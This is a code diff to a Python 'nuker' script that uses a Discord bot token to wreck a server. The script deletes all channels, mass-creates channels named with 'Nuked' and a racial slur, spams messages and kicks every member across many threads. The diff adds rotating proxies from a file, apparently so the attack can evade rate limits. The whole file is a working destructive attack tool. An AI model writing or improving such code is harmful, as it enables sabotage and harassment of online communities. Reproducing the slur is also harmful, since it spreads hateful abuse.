@@ -15,7 +15,6 @@ def print_logo():
     """)
 
 
-print_logo()
 try:
     import requests
     import time
@@ -25,8 +24,10 @@ except:
 
     print("Required modules not found, installing them...")
     system("python -m pip install requests")
+    system("python3 -m pip install requests")
     system("python -m pip install discord")
-    print("All modules installed, please restart the script.")
+    system("python3 -m pip install discord")
+    print("All modules should be installed, please restart the script.")
     input("Press enter to restart...")
 print_logo()
 # All parameters
@@ -43,14 +44,17 @@ CHANNEL_NAMES = [
     'Nuked',
     'Nigger'
 ]
+
 GUILD = int(input("Enter guild id: "))
 TOKEN = input("Enter token: ")
+USEPROXY = True if input("Use proxy Y/n") in ["y", "yes", "Y", "Yes", "YES"] else False
+print("Using proxies" if USEPROXY else "")
 headers = {'authorization': f'Bot {TOKEN}'}
 
 
 def get_all_channels():
     while True:
-        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers)
+        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers, proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -65,7 +69,7 @@ def get_all_members():
     url = f'https://discord.com/api/v10/guilds/{GUILD}/members?limit=1000'
 
     while True:
-        response = requests.get(url, headers=headers)
+        response = requests.get(url, headers=headers, proxies=get_proxy())
         if response.status_code == 200:
             members_data = response.json()
             members.extend(members_data)
@@ -84,7 +88,7 @@ def get_all_members():
 
 def remove_channel(chnl):
     while True:
-        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
+        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers, proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -96,7 +100,7 @@ def remove_channel(chnl):
 def channel(name):
     while True:
         json = {'name': name, 'type': 0}
-        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json)
+        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json, proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
         else:
@@ -112,7 +116,7 @@ def channel(name):
 def send_message(id):
     while True:
         json = {'content': random.choice(MESSAGES)}
-        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json)
+        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json, proxies=get_proxy())
         if 'retry_after' in r.text:
             time.sleep(r.json()['retry_after'])
 
@@ -120,7 +124,7 @@ def send_message(id):
 def kick_member(id):
     while True:
         url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}'
-        response = requests.delete(url, headers=headers)
+        response = requests.delete(url, headers=headers, proxies=get_proxy())
 
         if response.status_code == 204:
             print(f"Successfully kicked member: {id}")
@@ -137,6 +141,20 @@ def remove_members():
     while True:
         for profile in get_all_members():
             threading.Thread(target=kick_member, args=(profile['user']['id'],)).start()
+
+
+PROXIES = []
+with open('proxies.txt', 'r') as f:
+    for line in f.read().splitlines():
+        PROXIES.append(line)
+    print(f"Loaded {len(PROXIES)} proxies.")
+
+
+def get_proxy():
+    if not USEPROXY:
+        return None
+    PROXY = random.choice(PROXIES)
+    return {"http": PROXY, "https": PROXY}
 
 
 threading.Thread(target=remove_members).start()
